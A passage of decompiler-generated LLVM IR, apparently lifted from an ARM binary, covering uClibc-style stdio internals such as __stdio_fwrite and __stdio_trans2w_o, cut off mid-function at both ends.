  %v3_15c8c = icmp ult i32 %v0_15c8c, %v1_15c8c
  %v9_15c8c = icmp eq i32 %v0_15c8c, %v1_15c8c
  store i1 %v9_15c8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_15c8c, label %.preheader, label %bb23

bb23:                                             ; preds = %dec_label_pc_15c8c
  store i32 %v1_15c8c, i32* %r2.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_15c8c, %bb23
  %v2_15ca0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb24

bb24:                                             ; preds = %.preheader, %dec_label_pc_15cb4
  %v2_15ca0 = phi i32 [ %v2_15ca0.pre, %.preheader ], [ %v1_15cb8, %dec_label_pc_15cb4 ]
  %v0_15c94 = load i32, i32* %r6.global-to-local, align 4
  %v1_15c94 = inttoptr i32 %v0_15c94 to i8*
  %v2_15c94 = load i8, i8* %v1_15c94, align 1
  %v3_15c94 = zext i8 %v2_15c94 to i32
  store i32 %v3_15c94, i32* %r3.global-to-local, align 4
  %v7_15c98 = icmp eq i8 %v2_15c94, 10
  store i1 %v7_15c98, i1* %cpsr_z.global-to-local, align 1
  %v1_15c9c = add i32 %v0_15c94, 1
  store i32 %v1_15c9c, i32* %r6.global-to-local, align 4
  %v3_15ca0 = inttoptr i32 %v2_15ca0 to i8*
  store i8 %v2_15c94, i8* %v3_15ca0, align 1
  %v0_15ca4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15ca4, label %dec_label_pc_15ca8, label %dec_label_pc_15cb4

dec_label_pc_15ca8:                               ; preds = %bb24
  %v0_15ca8 = load i32, i32* %r4.global-to-local, align 4
  %v1_15ca8 = inttoptr i32 %v0_15ca8 to i16*
  %v2_15ca8 = load i16, i16* %v1_15ca8, align 2
  %v3_15ca8 = zext i16 %v2_15ca8 to i32
  store i32 %v3_15ca8, i32* %r3.global-to-local, align 4
  %v1_15cac = and i32 %v3_15ca8, 256
  %v2_15cac = icmp eq i32 %v1_15cac, 0
  store i1 %v2_15cac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15cac, label %dec_label_pc_15cb4, label %dec_label_pc_15ca8.dec_label_pc_15cc0_crit_edge

dec_label_pc_15ca8.dec_label_pc_15cc0_crit_edge:  ; preds = %dec_label_pc_15ca8
  %v0_15cc4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15cc0

dec_label_pc_15cb4:                               ; preds = %dec_label_pc_15ca8, %bb24
  %v0_15cb4 = load i32, i32* %r2.global-to-local, align 4
  %v1_15cb4 = add i32 %v0_15cb4, -1
  store i32 %v1_15cb4, i32* %r2.global-to-local, align 4
  %v7_15cb4 = icmp eq i32 %v0_15cb4, 1
  store i1 %v7_15cb4, i1* %cpsr_z.global-to-local, align 1
  %v0_15cb8 = load i32, i32* %r1.global-to-local, align 4
  %v1_15cb8 = add i32 %v0_15cb8, 1
  store i32 %v1_15cb8, i32* %r1.global-to-local, align 4
  br i1 %v7_15cb4, label %dec_label_pc_15cb4.dec_label_pc_15cc0_crit_edge, label %bb24

dec_label_pc_15cb4.dec_label_pc_15cc0_crit_edge:  ; preds = %dec_label_pc_15cb4
  %v0_15cc0.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15cc0

dec_label_pc_15cc0:                               ; preds = %dec_label_pc_15ca8.dec_label_pc_15cc0_crit_edge, %dec_label_pc_15cb4.dec_label_pc_15cc0_crit_edge
  %v0_15cc4 = phi i32 [ %v1_15cb8, %dec_label_pc_15cb4.dec_label_pc_15cc0_crit_edge ], [ %v0_15cc4.pre, %dec_label_pc_15ca8.dec_label_pc_15cc0_crit_edge ]
  %v0_15cc0 = phi i32 [ %v0_15cc0.pre, %dec_label_pc_15cb4.dec_label_pc_15cc0_crit_edge ], [ %v0_15ca8, %dec_label_pc_15ca8.dec_label_pc_15cc0_crit_edge ]
  %v1_15cc0 = add i32 %v0_15cc0, 8
  %v2_15cc0 = inttoptr i32 %v1_15cc0 to i32*
  %v3_15cc0 = load i32, i32* %v2_15cc0, align 4
  store i32 %v3_15cc0, i32* %r3.global-to-local, align 4
  %v2_15cc4 = add i32 %v0_15cc0, 16
  %v3_15cc4 = inttoptr i32 %v2_15cc4 to i32*
  store i32 %v0_15cc4, i32* %v3_15cc4, align 4
  %v0_15cc8 = load i32, i32* %r3.global-to-local, align 4
  %v1_15cc8 = load i32, i32* %r1.global-to-local, align 4
  %v2_15cc8 = sub i32 %v1_15cc8, %v0_15cc8
  store i32 %v2_15cc8, i32* %r3.global-to-local, align 4
  %v1_15ccc = load i32, i32* %r5.global-to-local, align 4
  %v2_15ccc = sub i32 %v1_15ccc, %v2_15cc8
  store i32 %v2_15ccc, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15cd0

dec_label_pc_15cd0:                               ; preds = %dec_label_pc_15c70.dec_label_pc_15cd0_crit_edge, %dec_label_pc_15cc0
  %v0_15cd0 = phi i32 [ %v0_15cd0.pre, %dec_label_pc_15c70.dec_label_pc_15cd0_crit_edge ], [ %v2_15ccc, %dec_label_pc_15cc0 ]
  %v1_15cd0 = load i32, i32* @r7, align 4
  %v2_15cd0 = sub i32 %v1_15cd0, %v0_15cd0
  br label %dec_label_pc_15cd4

dec_label_pc_15c44.dec_label_pc_15cd4.loopexit_crit_edge: ; preds = %dec_label_pc_15c44thread-pre-split
  %v0_15cd4.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_15cd4

dec_label_pc_15cd4:                               ; preds = %entry, %dec_label_pc_15c44.dec_label_pc_15cd4.loopexit_crit_edge, %dec_label_pc_15cd0
  %v0_15cd4 = phi i32 [ %v2_15cd0, %dec_label_pc_15cd0 ], [ %v0_15cd4.pre.pre, %dec_label_pc_15c44.dec_label_pc_15cd4.loopexit_crit_edge ], [ 0, %entry ]
  %v2_15cd8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_15cd8, i32* %r4.global-to-local, align 4
  ret i32 %v0_15cd4

; uselistorder directives
  uselistorder i32 %v0_15cc0, { 1, 0 }
  uselistorder i32 %v1_15cb8, { 0, 2, 1 }
  uselistorder i32 %v0_15cb4, { 1, 0 }
  uselistorder i32 %v1_15c8c, { 0, 2, 1 }
  uselistorder i32 %v0_15c8c, { 1, 0 }
  uselistorder i32 %v5_15c78, { 1, 0 }
  uselistorder i32 %v2_15c78, { 1, 0, 2 }
  uselistorder i32 %v3_15c5c, { 2, 3, 0, 1 }
  uselistorder i32 %v0_15c54, { 1, 0 }
  uselistorder i32 %v5_15c68, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 3, 4, 2, 1, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 2, 4, 3, 5, 6, 1, 0 }
  uselistorder i32* %r1.global-to-local, { 4, 1, 5, 3, 2, 6, 7, 8, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 (i32, i32)* @__GI_write, { 1, 2, 0 }
  uselistorder i32 2147483647, { 1, 6, 2, 5, 3, 4, 0 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_15cd4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15cd0, { 1, 0 }
  uselistorder label %dec_label_pc_15cc0, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_15c4c, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i16* %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg3 to i32
  %stack_var_-20 = alloca i32, align 4
  %v3_15ce0 = load i32, i32* @r4, align 4
  store i32 %v3_15ce0, i32* %stack_var_-20, align 4
  %v6_15ce0 = load i32, i32* @r5, align 4
  %v9_15ce0 = load i32, i32* @r6, align 4
  %v12_15ce0 = load i32, i32* @r7, align 4
  %v3_15ce4 = load i16, i16* %arg3, align 2
  %v4_15ce4 = zext i16 %v3_15ce4 to i32
  %v1_15ce8 = and i32 %v4_15ce4, 512
  store i32 %v1_15ce8, i32* @r4, align 4
  %v2_15ce8 = icmp eq i32 %v1_15ce8, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_15ce8, label %dec_label_pc_15d00, label %dec_label_pc_15dfc

dec_label_pc_15d00:                               ; preds = %entry
  %v2_15d00 = add i32 %tmp, 4
  %v3_15d00 = inttoptr i32 %v2_15d00 to i32*
  %v4_15d00 = load i32, i32* %v3_15d00, align 4
  %v2_15d08 = add i32 %tmp, 16
  %v3_15d08 = inttoptr i32 %v2_15d08 to i32*
  %v4_15d08 = load i32, i32* %v3_15d08, align 4
  store i32 %v4_15d08, i32* @r0, align 4
  %v2_15d0c = add i32 %tmp, 12
  %v3_15d0c = inttoptr i32 %v2_15d0c to i32*
  %v4_15d0c = load i32, i32* %v3_15d0c, align 4
  store i32 %v4_15d0c, i32* @r3, align 4
  %v4_15d10 = icmp eq i32 %v4_15d00, -2
  %v2_15d14 = sub i32 %v4_15d0c, %v4_15d08
  br i1 %v4_15d10, label %dec_label_pc_15d14, label %dec_label_pc_15d3c

dec_label_pc_15d14:                               ; preds = %dec_label_pc_15d00
  %v3_15d18 = icmp ugt i32 %v2_15d14, %arg2
  br i1 %v3_15d18, label %bb, label %bb12

bb:                                               ; preds = %dec_label_pc_15d14
  br label %bb12

bb12:                                             ; preds = %dec_label_pc_15d14, %bb
  %storemerge = phi i32 [ %arg2, %bb ], [ %v2_15d14, %dec_label_pc_15d14 ]
  %v0_15d20 = phi i32 [ %arg2, %bb ], [ %v2_15d14, %dec_label_pc_15d14 ]
  store i32 %storemerge, i32* @r4, align 4
  store i32 %v0_15d20, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_15d28 = call i32 @memcpy()
  %v0_15d2c = load i32, i32* @r5, align 4
  %v1_15d2c = add i32 %v0_15d2c, 16
  %v2_15d2c = inttoptr i32 %v1_15d2c to i32*
  %v3_15d2c = load i32, i32* %v2_15d2c, align 4
  %v1_15d30 = load i32, i32* @r4, align 4
  %v2_15d30 = add i32 %v1_15d30, %v3_15d2c
  store i32 %v2_15d30, i32* %v2_15d2c, align 4
  br label %dec_label_pc_15e10

dec_label_pc_15d3c:                               ; preds = %dec_label_pc_15d00
  store i32 %v2_15d14, i32* @r3, align 4
  %tmp18 = icmp ult i32 %v2_15d14, %arg2
  br i1 %tmp18, label %dec_label_pc_15ddc, label %dec_label_pc_15d48

dec_label_pc_15d48:                               ; preds = %dec_label_pc_15d3c
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_15d50 = call i32 @memcpy()
  %v0_15d54 = load i32, i32* @r5, align 4
  %v1_15d54 = add i32 %v0_15d54, 16
  %v2_15d54 = inttoptr i32 %v1_15d54 to i32*
  %v3_15d54 = load i32, i32* %v2_15d54, align 4
  %v1_15d58 = inttoptr i32 %v0_15d54 to i16*
  %v2_15d58 = load i16, i16* %v1_15d58, align 2
  %v1_15d5c = load i32, i32* @r6, align 4
  %v2_15d5c = add i32 %v1_15d5c, %v3_15d54
  %v1_15d60 = and i16 %v2_15d58, 256
  %v2_15d60 = icmp eq i16 %v1_15d60, 0
  store i32 %v2_15d5c, i32* %v2_15d54, align 4
  br i1 %v2_15d60, label %dec_label_pc_15e10, label %dec_label_pc_15d6c

dec_label_pc_15d6c:                               ; preds = %dec_label_pc_15d48
  %v0_15d6c = load i32, i32* @r7, align 4
  %v0_15d74 = load i32, i32* @r6, align 4
  %v4_15d78 = call i32 @memrchr(i32 %v0_15d6c, i32 10, i32 %v0_15d74, i32 %v2_15d5c)
  %v2_15d7c = icmp eq i32 %v4_15d78, 0
  br i1 %v2_15d7c, label %dec_label_pc_15e10, label %dec_label_pc_15d84

dec_label_pc_15d84:                               ; preds = %dec_label_pc_15d6c
  %v0_15d84 = load i32, i32* @r5, align 4
  store i32 %v0_15d84, i32* @r0, align 4
  %v0_15d88 = call i32 @__stdio_wcommit()
  %v2_15d8c = icmp eq i32 %v0_15d88, 0
  br i1 %v2_15d8c, label %dec_label_pc_15e10, label %dec_label_pc_15d94

dec_label_pc_15d94:                               ; preds = %dec_label_pc_15d84
  %v1_15d94 = load i32, i32* @r6, align 4
  %v3_15d94 = icmp uge i32 %v0_15d88, %v1_15d94
  %v1_15d94.v0_15d88 = select i1 %v3_15d94, i32 %v1_15d94, i32 %v0_15d88
  store i32 %v1_15d94.v0_15d88, i32* @r4, align 4
  %v2_15da0 = sub i32 %v1_15d94, %v1_15d94.v0_15d88
  %v0_15da4 = load i32, i32* @r7, align 4
  %v2_15da4 = add i32 %v0_15da4, %v2_15da0
  store i32 %v2_15da4, i32* %r7.global-to-local, align 4
  store i32 %v2_15da4, i32* @r0, align 4
  store i32 %v1_15d94.v0_15d88, i32* @r2, align 4
  %v4_15db4 = call i32 @__GI_memchr(i32 %v2_15da4, i32 10, i32 %v1_15d94.v0_15d88, i32 %v2_15da0)
  %v2_15db8 = icmp eq i32 %v4_15db4, 0
  br i1 %v2_15db8, label %dec_label_pc_15e10, label %dec_label_pc_15dc0

dec_label_pc_15dc0:                               ; preds = %dec_label_pc_15d94
  %v0_15dc0 = load i32, i32* @r5, align 4
  %v1_15dc0 = add i32 %v0_15dc0, 16
  %v2_15dc0 = inttoptr i32 %v1_15dc0 to i32*
  %v3_15dc0 = load i32, i32* %v2_15dc0, align 4
  %v0_15dc4 = load i32, i32* %r7.global-to-local, align 4
  %v1_15dc4 = load i32, i32* @r4, align 4
  %v2_15dc4 = sub i32 %v0_15dc4, %v4_15db4
  %v2_15dc8 = add i32 %v2_15dc4, %v1_15dc4
  %v2_15dcc = sub i32 %v3_15dc0, %v2_15dc8
  %v1_15dd0 = load i32, i32* @r6, align 4
  %v2_15dd0 = sub i32 %v1_15dd0, %v2_15dc8
  store i32 %v2_15dd0, i32* @r6, align 4
  store i32 %v2_15dcc, i32* %v2_15dc0, align 4
  br label %dec_label_pc_15e10

dec_label_pc_15ddc:                               ; preds = %dec_label_pc_15d3c
  %v2_15ddc = add i32 %tmp, 8
  %v3_15ddc = inttoptr i32 %v2_15ddc to i32*
  %v4_15ddc = load i32, i32* %v3_15ddc, align 4
  %v9_15de0 = icmp eq i32 %v4_15d08, %v4_15ddc
  br i1 %v9_15de0, label %dec_label_pc_15dfc, label %dec_label_pc_15de8

dec_label_pc_15de8:                               ; preds = %dec_label_pc_15ddc
  store i32 %tmp, i32* @r0, align 4
  %v0_15dec = call i32 @__stdio_wcommit()
  %v2_15df0 = icmp eq i32 %v0_15dec, 0
  br i1 %v2_15df0, label %dec_label_pc_15de8.dec_label_pc_15dfc_crit_edge, label %bb15

dec_label_pc_15de8.dec_label_pc_15dfc_crit_edge:  ; preds = %dec_label_pc_15de8
  %v0_15dfc.pre = load i32, i32* @r6, align 4
  %v0_15e00.pre = load i32, i32* @r5, align 4
  %v0_15e04.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_15dfc

bb15:                                             ; preds = %dec_label_pc_15de8
  %v1_15df4 = load i32, i32* @r4, align 4
  store i32 %v1_15df4, i32* @r6, align 4
  br label %dec_label_pc_15e10

dec_label_pc_15dfc:                               ; preds = %dec_label_pc_15de8.dec_label_pc_15dfc_crit_edge, %entry, %dec_label_pc_15ddc
  %v0_15e04 = phi i32 [ %v0_15e04.pre, %dec_label_pc_15de8.dec_label_pc_15dfc_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_15ddc ]
  %v0_15e00 = phi i32 [ %v0_15e00.pre, %dec_label_pc_15de8.dec_label_pc_15dfc_crit_edge ], [ %tmp, %entry ], [ %tmp, %dec_label_pc_15ddc ]
  %v0_15dfc = phi i32 [ %v0_15dfc.pre, %dec_label_pc_15de8.dec_label_pc_15dfc_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_15ddc ]
  %v1_15e00 = inttoptr i32 %v0_15e00 to i16*
  %v5_15e08 = call i32 @__stdio_WRITE(i16* %v1_15e00, i32 %v0_15e04, i32 %v0_15dfc)
  store i32 %v5_15e08, i32* @r6, align 4
  br label %dec_label_pc_15e10

dec_label_pc_15e10:                               ; preds = %bb15, %dec_label_pc_15d94, %dec_label_pc_15d84, %dec_label_pc_15d6c, %dec_label_pc_15d48, %dec_label_pc_15dc0, %bb12, %dec_label_pc_15dfc
  %v0_15e10 = load i32, i32* @r6, align 4
  %v2_15e18 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_15e18, i32* @r4, align 4
  store i32 %v6_15ce0, i32* @r5, align 4
  store i32 %v9_15ce0, i32* @r6, align 4
  store i32 %v12_15ce0, i32* @r7, align 4
  ret i32 %v0_15e10

; uselistorder directives
  uselistorder i32 %v2_15dc8, { 1, 0 }
  uselistorder i32 %v2_15da0, { 1, 0 }
  uselistorder i32 %v1_15d94.v0_15d88, { 1, 2, 0, 3 }
  uselistorder i32 %v1_15d94, { 1, 0, 2 }
  uselistorder i32 %v2_15d14, { 2, 4, 0, 1, 3 }
  uselistorder i32 %tmp, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 %arg2, { 3, 4, 5, 2, 0, 1, 6, 7 }
  uselistorder i32 %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_15e10, { 7, 0, 5, 1, 2, 3, 4, 6 }
  uselistorder label %dec_label_pc_15dfc, { 0, 2, 1 }
  uselistorder label %bb12, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15e20 = load i32, i32* @r4, align 4
  store i32 %v3_15e20, i32* %stack_var_-8, align 4
  %v3_15e24 = load i16, i16* %arg1, align 2
  %v4_15e24 = zext i16 %v3_15e24 to i32
  %v2_15e28 = and i32 %v4_15e24, %arg2
  %v4_15e28 = icmp eq i32 %v2_15e28, 0
  store i32 %tmp, i32* @r4, align 4
  br i1 %v4_15e28, label %dec_label_pc_15e34, label %dec_label_pc_15e44

dec_label_pc_15e34:                               ; preds = %entry
  %v1_15e34 = and i32 %v4_15e24, 2176
  %v2_15e34 = icmp eq i32 %v1_15e34, 0
  br i1 %v2_15e34, label %dec_label_pc_15e3c, label %dec_label_pc_15e50

dec_label_pc_15e3c:                               ; preds = %dec_label_pc_15e34
  %v2_15e3c = or i32 %v4_15e24, %arg2
  %v1_15e40 = trunc i32 %v2_15e3c to i16
  store i16 %v1_15e40, i16* %arg1, align 2
  %v0_15e44.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15e44

dec_label_pc_15e44:                               ; preds = %entry, %dec_label_pc_15e3c
  %v0_15e80 = phi i32 [ %tmp, %entry ], [ %v0_15e44.pre, %dec_label_pc_15e3c ]
  %v1_15e44 = inttoptr i32 %v0_15e80 to i16*
  %v2_15e44 = load i16, i16* %v1_15e44, align 2
  %v3_15e44 = zext i16 %v2_15e44 to i32
  store i32 %v3_15e44, i32* @ip, align 4
  %v1_15e48 = and i32 %v3_15e44, 32
  %v2_15e48 = icmp eq i32 %v1_15e48, 0
  br i1 %v2_15e48, label %dec_label_pc_15e70, label %dec_label_pc_15e50

dec_label_pc_15e50:                               ; preds = %dec_label_pc_15e34, %dec_label_pc_15e44
  %v0_15e50 = call i32 @__GI___errno_location()
  store i32 %v0_15e50, i32* %r0.global-to-local, align 4
  %v2_15e58 = inttoptr i32 %v0_15e50 to i32*
  store i32 9, i32* %v2_15e58, align 4
  br label %dec_label_pc_15e5c

dec_label_pc_15e5c:                               ; preds = %dec_label_pc_15e98, %dec_label_pc_15e50
  %v0_15e5c = load i32, i32* @r4, align 4
  %v1_15e5c = inttoptr i32 %v0_15e5c to i16*
  %v2_15e5c = load i16, i16* %v1_15e5c, align 2
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_15e64 = or i16 %v2_15e5c, 8
  store i16 %v1_15e64, i16* %v1_15e5c, align 2
  br label %bb11

dec_label_pc_15e70:                               ; preds = %dec_label_pc_15e44
  %tmp14 = urem i16 %v2_15e44, 4
  %v2_15e70 = icmp eq i16 %tmp14, 0
  br i1 %v2_15e70, label %dec_label_pc_15ecc, label %dec_label_pc_15e78

dec_label_pc_15e78:                               ; preds = %dec_label_pc_15e70
  %v1_15e78 = and i32 %v3_15e44, 4
  store i32 %v1_15e78, i32* @r1, align 4
  %v2_15e78 = icmp eq i32 %v1_15e78, 0
  br i1 %v2_15e78, label %dec_label_pc_15e80, label %dec_label_pc_15eb0

dec_label_pc_15e80:                               ; preds = %dec_label_pc_15e78
  %v1_15e80 = add i32 %v0_15e80, 20
  %v2_15e80 = inttoptr i32 %v1_15e80 to i32*
  %v3_15e80 = load i32, i32* %v2_15e80, align 4
  store i32 %v3_15e80, i32* %r2.global-to-local, align 4
  %v1_15e84 = add i32 %v0_15e80, 16
  %v2_15e84 = inttoptr i32 %v1_15e84 to i32*
  %v3_15e84 = load i32, i32* %v2_15e84, align 4
  %v9_15e88 = icmp eq i32 %v3_15e80, %v3_15e84
  br i1 %v9_15e88, label %dec_label_pc_15e90, label %dec_label_pc_15e98

dec_label_pc_15e90:                               ; preds = %dec_label_pc_15e80
  %v1_15e90 = and i32 %v3_15e44, 2
  %v2_15e90 = icmp eq i32 %v1_15e90, 0
  br i1 %v2_15e90, label %dec_label_pc_15eb0, label %dec_label_pc_15e98

dec_label_pc_15e98:                               ; preds = %dec_label_pc_15e80, %dec_label_pc_15e90
  %v1_15e98 = and i32 %v3_15e44, 1024
  %tmp12 = udiv i32 %v1_15e98, 1024
  %tmp13 = add nuw nsw i32 %tmp12, 1
  store i32 %tmp13, i32* %r2.global-to-local, align 4
  %v0_15ea4 = call i32 @__GI_fseek()
  store i32 %v0_15ea4, i32* %r0.global-to-local, align 4
  %v2_15ea8 = icmp eq i32 %v0_15ea4, 0
  br i1 %v2_15ea8, label %.dec_label_pc_15eb0_crit_edge, label %dec_label_pc_15e5c

.dec_label_pc_15eb0_crit_edge:                    ; preds = %dec_label_pc_15e98
  %v0_15eb0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15eb0

dec_label_pc_15eb0:                               ; preds = %.dec_label_pc_15eb0_crit_edge, %dec_label_pc_15e78, %dec_label_pc_15e90
  %v2_15ebc = phi i32 [ %v0_15eb0.pre, %.dec_label_pc_15eb0_crit_edge ], [ %v0_15e80, %dec_label_pc_15e78 ], [ %v0_15e80, %dec_label_pc_15e90 ]
  %v1_15eb0 = inttoptr i32 %v2_15ebc to i16*
  %v2_15eb0 = load i16, i16* %v1_15eb0, align 2
  %v1_15eb4 = add i32 %v2_15ebc, 8
  %v2_15eb4 = inttoptr i32 %v1_15eb4 to i32*
  %v3_15eb4 = load i32, i32* %v2_15eb4, align 4
  store i32 %v3_15eb4, i32* %r2.global-to-local, align 4
  %v1_15eb8 = and i16 %v2_15eb0, -4
  store i16 %v1_15eb8, i16* %v1_15eb0, align 2
  %v0_15ec0 = load i32, i32* %r2.global-to-local, align 4
  %v1_15ec0 = load i32, i32* @r4, align 4
  %v2_15ec0 = add i32 %v1_15ec0, 20
  %v3_15ec0 = inttoptr i32 %v2_15ec0 to i32*
  store i32 %v0_15ec0, i32* %v3_15ec0, align 4
  %v0_15ec4 = load i32, i32* %r2.global-to-local, align 4
  %v1_15ec4 = load i32, i32* @r4, align 4
  %v2_15ec4 = add i32 %v1_15ec4, 24
  %v3_15ec4 = inttoptr i32 %v2_15ec4 to i32*
  store i32 %v0_15ec4, i32* %v3_15ec4, align 4
  %v0_15ec8 = load i32, i32* %r2.global-to-local, align 4
  %v1_15ec8 = load i32, i32* @r4, align 4
  %v2_15ec8 = add i32 %v1_15ec8, 16
  %v3_15ec8 = inttoptr i32 %v2_15ec8 to i32*
  store i32 %v0_15ec8, i32* %v3_15ec8, align 4
  %v0_15ecc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15ecc

dec_label_pc_15ecc:                               ; preds = %dec_label_pc_15e70, %dec_label_pc_15eb0
  %v2_15ed8 = phi i32 [ %v0_15e80, %dec_label_pc_15e70 ], [ %v0_15ecc.pre, %dec_label_pc_15eb0 ]
  %v1_15ecc = inttoptr i32 %v2_15ed8 to i16*
  %v2_15ecc = load i16, i16* %v1_15ecc, align 2
  %v3_15ecc = zext i16 %v2_15ecc to i32
  %v1_15ed0 = or i16 %v2_15ecc, 64
  %v1_15ed4 = and i32 %v3_15ecc, 2816
  store i32 %v1_15ed4, i32* %r0.global-to-local, align 4
  %v2_15ed4 = icmp eq i32 %v1_15ed4, 0
  store i16 %v1_15ed0, i16* %v1_15ecc, align 2
  br i1 %v2_15ed4, label %bb10, label %.thread1

bb10:                                             ; preds = %dec_label_pc_15ecc
  %v1_15edc = load i32, i32* @r4, align 4
  %v2_15edc = add i32 %v1_15edc, 12
  %v3_15edc = inttoptr i32 %v2_15edc to i32*
  %v4_15edc = load i32, i32* %v3_15edc, align 4
  %v3_15ee0 = add i32 %v1_15edc, 28
  %v4_15ee0 = inttoptr i32 %v3_15ee0 to i32*
  store i32 %v4_15edc, i32* %v4_15ee0, align 4
  br label %bb11

.thread1:                                         ; preds = %dec_label_pc_15ecc
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb11

bb11:                                             ; preds = %bb10, %dec_label_pc_15e5c, %.thread1
  %v2_15ee8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15ee8, i32* @r4, align 4
  %v1_15eec = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_15eec

; uselistorder directives
  uselistorder i32 %v2_15ebc, { 1, 0 }
  uselistorder i32 %v0_15e80, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v4_15e24, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 4, 3, 5 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %bb11, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15ecc, { 1, 0 }
  uselistorder label %dec_label_pc_15eb0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_15e98, { 1, 0 }
  uselistorder label %dec_label_pc_15e50, { 1, 0 }
  uselistorder label %dec_label_pc_15e44, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %v0_15ef0 = load i32, i32* @r2, align 4
  %v1_15ef0 = icmp slt i32 %v0_15ef0, 0
  %v0_15ef4 = load i32, i32* @r0, align 4
  %v1_15ef8 = and i32 %v0_15ef4, 2048
  %v2_15f2c = icmp eq i32 %v1_15ef8, 0
  br i1 %v1_15ef0, label %dec_label_pc_15f2c, label %dec_label_pc_15f00

dec_label_pc_15f00:                               ; preds = %entry
  br i1 %v2_15f2c, label %dec_label_pc_15f08, label %dec_label_pc_15f34

dec_label_pc_15f08:                               ; preds = %dec_label_pc_15f00
  %v7_15f08 = icmp eq i32 %v0_15ef4, 256
  %v0_15f0c = load i32, i32* @r1, align 4
  %v1_15f0c = inttoptr i32 %v0_15f0c to i32*
  %v2_15f0c = load i32, i32* %v1_15f0c, align 4
  %v2_15f10 = urem i32 %v2_15f0c, 256
  %v2_15f10.v2_15f0c = select i1 %v7_15f08, i32 %v2_15f10, i32 %v2_15f0c
  br i1 %v7_15f08, label %.thread, label %dec_label_pc_15f18

dec_label_pc_15f18:                               ; preds = %dec_label_pc_15f08
  %v7_15f18 = icmp eq i32 %v0_15ef4, 512
  br i1 %v7_15f18, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_15f18
  %v4_15f20 = urem i32 %v2_15f10.v2_15f0c, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_15f18, %dec_label_pc_15f08, %bb
  %v1_15f28 = phi i32 [ %v2_15f0c, %dec_label_pc_15f18 ], [ %v2_15f10, %dec_label_pc_15f08 ], [ %v4_15f20, %bb ]
  store i32 0, i32* @r1, align 4
  ret i32 %v1_15f28

dec_label_pc_15f2c:                               ; preds = %entry
  br i1 %v2_15f2c, label %dec_label_pc_15f3c, label %dec_label_pc_15f34

dec_label_pc_15f34:                               ; preds = %dec_label_pc_15f00, %dec_label_pc_15f2c
  %v0_15f34 = load i32, i32* @r1, align 4
  %v1_15f34 = inttoptr i32 %v0_15f34 to i32*
  %v2_15f34 = load i32, i32* %v1_15f34, align 4
  %v3_15f34 = add i32 %v0_15f34, 4
  %v4_15f34 = inttoptr i32 %v3_15f34 to i32*
  %v5_15f34 = load i32, i32* %v4_15f34, align 4
  store i32 %v5_15f34, i32* @r1, align 4
  ret i32 %v2_15f34

dec_label_pc_15f3c:                               ; preds = %dec_label_pc_15f2c
  %v7_15f3c = icmp eq i32 %v0_15ef4, 256
  %v0_15f40 = load i32, i32* @r1, align 4
  %v1_15f40 = inttoptr i32 %v0_15f40 to i32*
  %v2_15f40 = load i32, i32* %v1_15f40, align 4
  %v2_15f44 = urem i32 %v2_15f40, 256
  %v2_15f44.v2_15f40 = select i1 %v7_15f3c, i32 %v2_15f44, i32 %v2_15f40
  br i1 %v7_15f3c, label %.thread2, label %dec_label_pc_15f4c

dec_label_pc_15f4c:                               ; preds = %dec_label_pc_15f3c
  %v7_15f4c = icmp eq i32 %v0_15ef4, 512
  br i1 %v7_15f4c, label %bb5, label %.thread2

bb5:                                              ; preds = %dec_label_pc_15f4c
